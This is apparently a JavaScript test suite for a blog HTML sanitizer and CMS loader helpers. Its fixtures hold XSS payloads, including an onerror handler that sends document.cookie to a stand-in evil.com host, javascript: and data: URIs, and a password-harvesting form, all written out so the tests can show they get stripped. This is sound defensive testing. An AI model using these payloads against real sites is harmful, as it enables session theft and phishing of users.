import { describe, it, afterEach } from "node:test";
import assert from "node:assert/strict";
import {
  sanitizeBlogHtml,
  ALLOWED_TAGS,
  ALLOWED_SCHEMES,
} from "../../src/lib/security/sanitize-blog-html";
import {
  normalizeBlogSlug,
  getBlogImageUrl,
  getAllBlogs,
  getBlogBySlug,
  getSuggestedBlogs,
  getSidebarBlogs,
} from "../../src/lib/cms/blogs";

describe("S01 Security - Blog HTML Allowlist Sanitizer", () => {
  describe("Malicious HTML Fixtures & XSS Attack Vectors", () => {
    it("strips raw script tags and their executable contents", () => {
      const malicious = `<p>Welcome</p><script>alert('XSS-01')</script>`;
      const clean = sanitizeBlogHtml(malicious);

      assert.strictEqual(clean.includes("<script>"), false);
      assert.strictEqual(clean.includes("alert("), false);
      assert.ok(clean.includes("<p>Welcome</p>"));
    });

    it("strips external script tags", () => {
      const malicious = `<script src="https://evil.attacker.com/payload.js"></script><p>Text</p>`;
      const clean = sanitizeBlogHtml(malicious);

      assert.strictEqual(clean.includes("<script"), false);
      assert.strictEqual(clean.includes("evil.attacker.com"), false);
      assert.ok(clean.includes("<p>Text</p>"));
    });

    it("strips inline event handlers (onerror, onload, onclick, onmouseover)", () => {
      const malicious = `
        <img src="https://valid.com/pic.jpg" onerror="fetch('https://evil.com/steal?c=' + document.cookie)" />
        <p onmouseover="alert('hover')">Hover text</p>
        <a href="https://dluxtech.com" onclick="alert('click')">Link</a>
      `;
      const clean = sanitizeBlogHtml(malicious);

      assert.strictEqual(clean.includes("onerror"), false);
      assert.strictEqual(clean.includes("onmouseover"), false);
      assert.strictEqual(clean.includes("onclick"), false);
      assert.strictEqual(clean.includes("document.cookie"), false);
      assert.ok(clean.includes("<img"));
      assert.ok(clean.includes("<a"));
    });

    it("rejects javascript: pseudo-protocol in anchor links", () => {
      const payloads = [
        `<a href="javascript:alert(1)">Click Me</a>`,
        `<a href="JAVASCRIPT:alert(1)">Click Me</a>`,
        `<a href="javascript:/*--></title></style></textarea></script>alert(1)">Click Me</a>`,
        `<a href="  javascript:alert(1)">Click Me</a>`,
      ];

      for (const payload of payloads) {
        const clean = sanitizeBlogHtml(payload);
        assert.strictEqual(clean.includes("javascript:"), false);
        assert.strictEqual(clean.includes("JAVASCRIPT:"), false);
        assert.strictEqual(clean.includes("alert(1)"), false);
      }
    });

    it("rejects vbscript: and data: pseudo-protocols in anchor links and images", () => {
      const malicious = `
        <a href="vbscript:msgbox(1)">VBScript link</a>
        <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Data URI link</a>
        <img src="javascript:alert(1)" />
      `;
      const clean = sanitizeBlogHtml(malicious);

      assert.strictEqual(clean.includes("vbscript:"), false);
      assert.strictEqual(clean.includes("data:text/html"), false);
      assert.strictEqual(clean.includes("javascript:"), false);
    });

    it("disallows dangerous embedding elements (iframe, object, embed, applet)", () => {
      const malicious = `
        <iframe src="https://evil.com/phishing"></iframe>
        <object data="https://evil.com/exploit.swf"></object>
        <embed src="https://evil.com/bad.swf" />
      `;
      const clean = sanitizeBlogHtml(malicious);

      assert.strictEqual(clean.includes("<iframe"), false);
      assert.strictEqual(clean.includes("<object"), false);
      assert.strictEqual(clean.includes("<embed"), false);
    });

    it("disallows interactive form injection (form, input, button, textarea)", () => {
      const malicious = `
        <form action="https://evil.com/steal" method="POST">
          <input type="password" name="pwd" />
          <button type="submit">Submit</button>
        </form>
      `;
      const clean = sanitizeBlogHtml(malicious);

      assert.strictEqual(clean.includes("<form"), false);
      assert.strictEqual(clean.includes("<input"), false);
      assert.strictEqual(clean.includes("<button"), false);
    });

    it("prevents reverse tabnabbing by enforcing rel='noopener noreferrer' on target='_blank'", () => {
      const input = `<a href="https://example.com" target="_blank">External Link</a>`;
      const clean = sanitizeBlogHtml(input);

      assert.ok(clean.includes('target="_blank"'));
      assert.ok(clean.includes("noopener"));
      assert.ok(clean.includes("noreferrer"));
    });

    it("strips malicious nested / mutation XSS payloads without leaving executable tags", () => {
      // In regex-based sanitizers, replacing `<script>` from `<scr<script>ipt>` leaves `<script>alert(1)</script>`.
      // Our AST parser-based sanitizer prevents this by never reconstructing executable script elements.
      const malicious = `<scr<script>ipt>alert(1)</script>`;
      const clean = sanitizeBlogHtml(malicious);

      assert.strictEqual(clean.includes("<script"), false);
      assert.strictEqual(clean.includes("</script>"), false);
    });
  });

  describe("Legitimate Formatting Preservation", () => {
    it("preserves standard typography elements (headings, paragraphs, lists)", () => {
      const html = `
        <h1>Article Heading</h1>
        <h2>Subheading</h2>
        <p>This is a paragraph with <strong>bold text</strong>, <em>italic text</em>, and <code>code</code>.</p>
        <ul>
          <li>List Item 1</li>
          <li>List Item 2</li>
        </ul>
        <ol>
          <li>Step 1</li>
        </ol>
      `;
      const clean = sanitizeBlogHtml(html);

      assert.ok(clean.includes("<h1>Article Heading</h1>"));
      assert.ok(clean.includes("<h2>Subheading</h2>"));
      assert.ok(clean.includes("<strong>bold text</strong>"));
      assert.ok(clean.includes("<em>italic text</em>"));
      assert.ok(clean.includes("<code>code</code>"));
      assert.ok(clean.includes("<li>List Item 1</li>"));
      assert.ok(clean.includes("<ol>"));
    });

    it("preserves safe blockquotes, preformatted code, and tables", () => {
      const html = `
        <blockquote>An insightful industry quote.</blockquote>
        <pre><code>const a = 1;</code></pre>
        <table>
          <thead>
            <tr><th>Metric</th><th>Score</th></tr>
          </thead>
          <tbody>
            <tr><td>Speed</td><td>99</td></tr>
          </tbody>
        </table>
      `;
      const clean = sanitizeBlogHtml(html);

      assert.ok(clean.includes("<blockquote>An insightful industry quote.</blockquote>"));
      assert.ok(clean.includes("<pre><code>const a = 1;</code></pre>"));
      assert.ok(clean.includes("<table>"));
      assert.ok(clean.includes("<th>Metric</th>"));
      assert.ok(clean.includes("<td>99</td>"));
    });

    it("preserves valid links with safe schemes (https, http, mailto)", () => {
      const html = `
        <p>Contact us at <a href="mailto:sales@dluxtech.com">sales@dluxtech.com</a> or visit <a href="https://www.dluxtech.com/about">our website</a>.</p>
      `;
      const clean = sanitizeBlogHtml(html);

      assert.ok(clean.includes('href="mailto:sales@dluxtech.com"'));
      assert.ok(clean.includes('href="https://www.dluxtech.com/about"'));
    });

    it("preserves legitimate images with safe attributes and adds lazy loading", () => {
      const html = `<img src="https://admin.dluxtech.com/images/hero.jpg" alt="Hero Banner" width="800" height="400" />`;
      const clean = sanitizeBlogHtml(html);

      assert.ok(clean.includes('src="https://admin.dluxtech.com/images/hero.jpg"'));
      assert.ok(clean.includes('alt="Hero Banner"'));
      assert.ok(clean.includes('loading="lazy"'));
    });

    it("gracefully handles null, undefined, or empty strings", () => {
      assert.strictEqual(sanitizeBlogHtml(null), "");
      assert.strictEqual(sanitizeBlogHtml(undefined), "");
      assert.strictEqual(sanitizeBlogHtml(""), "");
      assert.strictEqual(sanitizeBlogHtml("   "), "");
    });
  });

  describe("Slug Normalization & Image URL Helpers", () => {
    it("correctly strips legacy CMS prefix from blog slugs", () => {
      const raw = "httpswwwdluxtechcomblogai-marketing-trends-2026";
      const clean = normalizeBlogSlug(raw);
      assert.strictEqual(clean, "ai-marketing-trends-2026");
    });

    it("preserves already clean blog slugs", () => {
      const raw = "future-of-enterprise-analytics";
      const clean = normalizeBlogSlug(raw);
      assert.strictEqual(clean, "future-of-enterprise-analytics");
    });

    it("handles undefined or empty slugs gracefully", () => {
      assert.strictEqual(normalizeBlogSlug(undefined), "");
      assert.strictEqual(normalizeBlogSlug(""), "");
    });

    it("normalizes image URLs correctly", () => {
      assert.strictEqual(
        getBlogImageUrl("https://admin.dluxtech.com/uploads/photo.jpg"),
        "https://admin.dluxtech.com/uploads/photo.jpg"
      );
      assert.strictEqual(
        getBlogImageUrl("/uploads/photo.jpg"),
        "https://admin.dluxtech.com/uploads/photo.jpg"
      );
      assert.strictEqual(
        getBlogImageUrl("uploads/photo.jpg"),
        "https://admin.dluxtech.com/uploads/photo.jpg"
      );
      assert.strictEqual(getBlogImageUrl(""), "");
      assert.strictEqual(getBlogImageUrl(undefined), "");
    });
  });

  describe("Server Loader, Direct Navigation, CMS Failure & Suggested Articles", () => {
    const originalFetch = globalThis.fetch;

    const mockBlogs = [
      {
        _id: "1",
        title: "Enterprise AI Security In 2026",
        slug: "httpswwwdluxtechcomblogenterprise-ai-security",
        excerpt: "An overview of AI security in enterprise.",
        content: `<h2>Security First</h2><p>Safe content.</p><script>alert('pwned')</script>`,
        featuredImage: "/uploads/ai.jpg",
        categories: ["AI", "Security"],
        publishDate: "2026-03-01",
        createdAt: "2026-03-01",
      },
      {
        _id: "2",
        title: "Cloud Data Architectures",
        slug: "cloud-data-architectures",
        excerpt: "Modern cloud data pipelines.",
        content: `<p>Cloud architecture guide.</p>`,
        featuredImage: "https://admin.dluxtech.com/uploads/cloud.jpg",
        categories: ["Cloud"],
        publishDate: "2026-03-05",
        createdAt: "2026-03-05",
      },
      {
        _id: "3",
        title: "Customer Journey Analytics",
        slug: "customer-journey-analytics",
        excerpt: "Analyzing omnichannel customer journeys.",
        content: `<p>Analytics guide.</p>`,
        featuredImage: "",
        categories: ["MarTech"],
        publishDate: "2026-03-10",
        createdAt: "2026-03-10",
      },
      {
        _id: "4",
        title: "Next.js 16 Best Practices",
        slug: "nextjs-16-best-practices",
        excerpt: "Server components and App Router optimizations.",
        content: `<p>Framework optimizations.</p>`,
        featuredImage: "",
        categories: ["Engineering"],
        publishDate: "2026-03-12",
        createdAt: "2026-03-12",
      },
    ];

    afterEach(() => {
      globalThis.fetch = originalFetch;
    });

    it("direct navigation loads article and automatically sanitizes unsafe content", async () => {
      globalThis.fetch = async () =>
        new Response(
          JSON.stringify({ success: true, blogs: mockBlogs }),
          { status: 200, headers: { "Content-Type": "application/json" } }
        );

      const blog = await getBlogBySlug("enterprise-ai-security");
      assert.ok(blog);
      assert.strictEqual(blog.title, "Enterprise AI Security In 2026");
      assert.strictEqual(blog.slug, "enterprise-ai-security");
      // Verify unsafe script was automatically sanitized by the server loader
      assert.strictEqual(blog.content.includes("<script>"), false);
      assert.strictEqual(blog.content.includes("alert("), false);
      assert.ok(blog.content.includes("<h2>Security First</h2>"));
    });

    it("missing slug returns null instead of throwing", async () => {
      globalThis.fetch = async () =>
        new Response(
          JSON.stringify({ success: true, blogs: mockBlogs }),
          { status: 200, headers: { "Content-Type": "application/json" } }
        );

      const emptySlug = await getBlogBySlug("");
      assert.strictEqual(emptySlug, null);

      const nonExistent = await getBlogBySlug("non-existent-article-xyz");
      assert.strictEqual(nonExistent, null);
    });

    it("handles CMS HTTP 500 failure gracefully without unhandled crashes", async () => {
      globalThis.fetch = async () =>
        new Response("Internal Server Error", { status: 500 });

      const all = await getAllBlogs();
      assert.deepStrictEqual(all, []);

      const post = await getBlogBySlug("enterprise-ai-security");
      assert.strictEqual(post, null);
    });

    it("handles CMS network failure / timeout rejection gracefully", async () => {
      globalThis.fetch = async () => {
        throw new Error("ETIMEDOUT: Connection refused to admin.dluxtech.com");
      };

      const all = await getAllBlogs();
      assert.deepStrictEqual(all, []);

      const post = await getBlogBySlug("any-slug");
      assert.strictEqual(post, null);
    });

    it("suggested articles exclude the current slug and respect the limit", async () => {
      globalThis.fetch = async () =>
        new Response(
          JSON.stringify({ success: true, blogs: mockBlogs }),
          { status: 200, headers: { "Content-Type": "application/json" } }
        );

      const currentSlug = "cloud-data-architectures";
      const suggested = await getSuggestedBlogs(currentSlug, 2);

      assert.strictEqual(suggested.length, 2);
      assert.ok(suggested.every((s) => s.slug !== currentSlug));
    });

    it("sidebar articles exclude the current slug and respect the limit", async () => {
      globalThis.fetch = async () =>
        new Response(
          JSON.stringify({ success: true, blogs: mockBlogs }),
          { status: 200, headers: { "Content-Type": "application/json" } }
        );

      const currentSlug = "enterprise-ai-security";
      const sidebar = await getSidebarBlogs(currentSlug, 3);

      assert.strictEqual(sidebar.length, 3);
      assert.ok(sidebar.every((s) => s.slug !== currentSlug));
    });
  });

  describe("Allowlist Security Constants Integrity", () => {
    it("ensures ALLOWED_SCHEMES strictly excludes executable schemes", () => {
      assert.ok(ALLOWED_SCHEMES.includes("https"));
      assert.ok(ALLOWED_SCHEMES.includes("http"));
      assert.ok(ALLOWED_SCHEMES.includes("mailto"));
      assert.strictEqual(ALLOWED_SCHEMES.includes("javascript"), false);
      assert.strictEqual(ALLOWED_SCHEMES.includes("data"), false);
      assert.strictEqual(ALLOWED_SCHEMES.includes("vbscript"), false);
    });

    it("ensures ALLOWED_TAGS excludes all active scripting and embedding tags", () => {
      assert.strictEqual(ALLOWED_TAGS.includes("script"), false);
      assert.strictEqual(ALLOWED_TAGS.includes("iframe"), false);
      assert.strictEqual(ALLOWED_TAGS.includes("object"), false);
      assert.strictEqual(ALLOWED_TAGS.includes("embed"), false);
      assert.strictEqual(ALLOWED_TAGS.includes("style"), false);
      assert.strictEqual(ALLOWED_TAGS.includes("meta"), false);
    });
  });
});

